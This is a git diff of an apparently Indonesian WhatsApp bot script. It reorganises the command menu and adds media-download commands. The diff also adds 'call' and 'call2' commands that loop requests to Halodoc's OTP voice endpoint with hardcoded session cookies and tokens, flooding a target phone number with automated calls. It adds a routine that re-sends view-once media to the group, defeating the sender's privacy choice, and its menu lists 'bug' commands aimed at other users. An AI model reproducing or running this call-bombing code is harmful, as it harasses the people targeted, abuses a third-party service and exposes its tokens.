@@ -29,6 +29,7 @@ const { exec, spawn, execSync } = require("child_process")
 const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 const { smsg, formatp, hitungmundur, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
 const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
+const { fetchBuffer, buffergif } = require("./lib/myfunc2")
 
 const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
 const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
@@ -424,12 +425,26 @@ conn.readMessages([m.key])
       if (!conn.public) {
          if (!m.key.fromMe && !isCreator) return
       }
+      if (m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
+         try {
+            await conn.ev.emit("viewOnceMessage", m);
+         } catch (err) {
+            console.error(util.format(err))
+         }
+      }
 /*let rn = ['recording']
 let jd = rn[Math.floor(Math.random() * rn.length)];
 if (m.message) {
 conn.sendPresenceUpdate(jd, from)
 console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
 }*/
+//Anti ViewOnce
+if (m.isGroup && m.mtype == 'viewOnceMessage') {
+let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
+conn.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
+await sleep(500)
+m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m})
+}
 // Anti Link
 if (AntiLink) {
 if (body.match(/(chat.whatsapp.com\/)/gi)) {
@@ -611,8 +626,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "title": `*Hay ${pushname} 👋*
 ${shinchantime}
 Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-「 \`\`\`DATABASE\`\`\` 」
+━━━━━━━━━━━━━━「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」━━━━━━━━━━━━━━━━━
 _Status : ${isCreator ? 'Owner' : 'User'}_
 _Nama : ${pushname}_
 _Nomor : @${stod.split('@')[0]}_
@@ -622,53 +636,71 @@ _Speed : ${latensii.toFixed(4)} Second_
 Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
 Hostname : ${os.hostname()}
 Platform : ${os.platform()}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-( REAL TIME )
+━━━━━━━━━━━━━━━━━( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )━━━━━━━━━━━━━━━━
 ${week} ${weton}, ${date}
 ${time}
 ${wita}
 ${wit}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
+━━━━━━━━━━━━━━━( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )━━━━━━━━━━━━━━
  ${mundur}
  Hijriah : ${dateIslamic}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-  *FITUR FREE MENU* 
-━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━( 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 )━━━━━━━━━━━━━━━━━
+﹗
+➤ pixivdl (perlu code pixiv) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ spotify (link Spotify) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ nhentai (code hentai) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ tiktok (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ tiktokmp3 (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ play (cari lagu apa?) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ ytmp3 (link yt) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ ytmp4 (link yt) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝘼𝙄 & 𝙀𝙉𝘾𝙃𝘼𝙉𝙏 )━━━━━━━━━━━━━━━━━
+﹗
 ➤ ai/openai [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ loli [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ waifu [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ remini (reply gambar) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ 4k (reply gambar) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ pixivdl (perlu code pixiv) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ smeme (reply gambar) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ spotify (link Spotify) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝙋𝙀𝙉𝘾𝘼𝙍𝙄𝘼𝙉 )━━━━━━━━━━━━━━━━━
 ➤ spotifysearch (search) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ pinterest (search) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ wallpaper (search) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ wallpaper2 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ carihentai (Lu mo nyari apa?) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ nhentai (code hentai) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ qc (Masukan Teks) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝘼𝙇𝘼𝙏 𝘽𝘼𝙉𝙏𝙐 )━━━━━━━━━━━━━━━━━
+﹗
 ➤ aksarajawa [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ latin (translate aksara jawa) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ lens / googlelens [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ tiktok (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ tiktokmp3 (link) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ bypassouo (anti iklan boss) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
-➤ bypassmirror (langsung ke inti) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝙎𝙏𝙄𝙆𝙀𝙍 )━━━━━━━━━━━━━━━━━
+﹗
 ➤ ttp [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ ttp2 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ ttp3 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ ttp4 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ attp [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ sticker [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ qc (Masukan Teks) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ smeme (reply gambar) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 )━━━━━━━━━━━━━━━━━
+﹗
 ➤ toimg [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ take/wm [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ toaudio [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ tomp3 [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ togif [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
 ➤ tovn [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
+━━━━━━━━━━━━━━━━( 𝘽𝙔𝙋𝘼𝙎𝙎 𝙄𝙆𝙇𝘼𝙉 )━━━━━━━━━━━━━━━━━
+﹗
+➤ bypassouo (anti iklan boss) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+➤ bypassmirror (langsung ke inti) [ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝗞𝗧𝗜𝗙 ]
+﹗
 ━━━━━━━━━━━━━━━━━━━
 ➤ nsfwmenu (18+)
 ➤ grupmenu (Owner)
@@ -861,6 +893,8 @@ ${wit}
 ➤ promoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ demoteall [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ repeat [ 𝗢𝗪𝗡𝗘𝗥 ]
+➤ call [ 𝗢𝗪𝗡𝗘𝗥 ]
+➤ id [ 𝗢𝗪𝗡𝗘𝗥 ]
 ━━━━━━━━━━━━━━━
 `,
 }
@@ -918,6 +952,7 @@ ${wit}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
   *ONLY PRIVATE CHAT* 
 ━━━━━━━━━━━━━━━━━━━━━━
+➤ oy (Bug Call New) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ sendbug (Bug Call) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ sendbugtroli (Bug Troli) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ sendbugpc (Bug Invite) [ 𝗢𝗪𝗡𝗘𝗥 ]
@@ -925,6 +960,7 @@ ${wit}
 ━━━━━━━━━━━
   *ONLY GRUP* 
 ━━━━━━━━━━━
+➤ oygc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ sendbuggc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ➤ sendbugtroligc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
 ━━━━━━━━━━━━━━━
@@ -1796,6 +1832,69 @@ try {
 						replyerror("Yah Proses Gagal :(");
 					}
 					}
+}
+break
+case 'play':  case 'song': {
+if (!text) return paycall(`Example : ${prefix + command} DJ MALAM INI`)
+const shinchanplaymp3 = require('./lib/ytdl2')
+let yts = require("youtube-yts")
+        let search = await yts(text)
+        let anup3k = search.videos[0]
+        paycall(global.wait)
+const pl= await shinchanplaymp3.mp3(anup3k.url)
+await conn.sendMessage(m.chat,{
+    audio: fs.readFileSync(pl.path),
+    fileName: anup3k.title + '.mp3',
+    mimetype: 'audio/mp4', ptt: false,
+    contextInfo:{
+        externalAdReply:{
+            title:anup3k.title,
+            body: botname,
+            thumbnail: await fetchBuffer(pl.meta.image),
+            mediaType:2,
+            mediaUrl:anup3k.url,
+        }
+
+    },
+},{quoted: fkontak})
+await fs.unlinkSync(pl.path)
+}
+break
+case "ytmp3": case "ytaudio":
+const shinchanmp3 = require('./lib/ytdl2')
+if (args.length < 1 || !isUrl(text) || !shinchanmp3.isYTUrl(text)) return paycall(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
+paycall(global.wait)
+const audio=await shinchanmp3.mp3(text)
+await conn.sendMessage(m.chat,{
+    audio: fs.readFileSync(audio.path),
+    mimetype: 'audio/mp4', ptt: false,
+    contextInfo:{
+        externalAdReply:{
+            title:audio.meta.title,
+            body: botname,
+            thumbnail: await fetchBuffer(audio.meta.image),
+            mediaType:2,
+            mediaUrl:text,
+        }
+
+    },
+},{quoted: fkontak})
+await fs.unlinkSync(audio.path)
+break
+case 'ytmp4': case 'ytvideo': {
+const shinchanmp4 = require('./lib/ytdl2')
+if (args.length < 1 || !isUrl(text) || !shinchanmp4.isYTUrl(text)) paycall(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
+paycall(global.wait)
+const vid=await shinchanmp4.mp4(text)
+const ytc=`
+*🐼Tittle:* ${vid.title}
+*🐼Date:* ${vid.date}
+*🐼Duration:* ${vid.duration}
+*🐼Quality:* ${vid.quality}`
+await conn.sendMessage(m.chat,{
+    video: {url:vid.videoUrl},
+    caption: ytc
+},{quoted: fkontak})
 }
 break
 //========================NHENTAI END=========================//
@@ -2873,10 +2972,31 @@ break
 //=================================================//
 case "call":
 if (!isCreator) return m.reply('*khusus Premium*')
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6281214281312`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6282788388737`)
 let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
-if (args[0].startsWith(`+6281214281312`)) return reply('Tidak bisa call ke nomor ini!')
-axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
+if (args[0].startsWith(`+0`)) return paycall('Tidak bisa call ke nomor ini!')
+for (let x = 0; x < 10; x++) {
+axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {paycall(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {paycall(`${JSON.stringify(error, null, 2)}`)})
+}
+break
+case "call2":
+if (!isCreator) return reply('Khusus Owner')
+let shinchan = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
+let shinko = text.split("|")[1]
+for (let i = 1; i < shinko ; i++){
+axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${shinchan}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}})
+.then(res => {
+console.log(res);
+}).catch(err => {
+console.log(`[${new Date().toLocaleTimeString()}] Succes Spam (CALL) BY SHINCHAN SENPAI INC`);
+})
+.catch(res => {
+console.log(res);
+}).catch(err => {
+console.log(`[${new Date().toLocaleTimeString()}] Failed Spam (CALL) BY SHINCHAN SENPAI INC`);
+});
+}
+reply(`[ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙎𝙚𝙣𝙙 𝘾𝙖𝙡𝙡 ]\n\n﹗𝐂𝐚𝐥𝐥 : ${shinchan}\n﹗𝐀𝐦𝐨𝐮𝐧𝐭 : ${shinko}\n﹗𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}\n﹗𝐓𝐚𝐧𝐠𝐠𝐚𝐥 : ${week} ${weton}, ${date}\n﹗𝐉𝐚𝐦 : ${time}\n﹗𝐎𝐰𝐧𝐞𝐫 : ẉa.me/6282134110253`)
 break
 //=================================================
 case 'sms': {
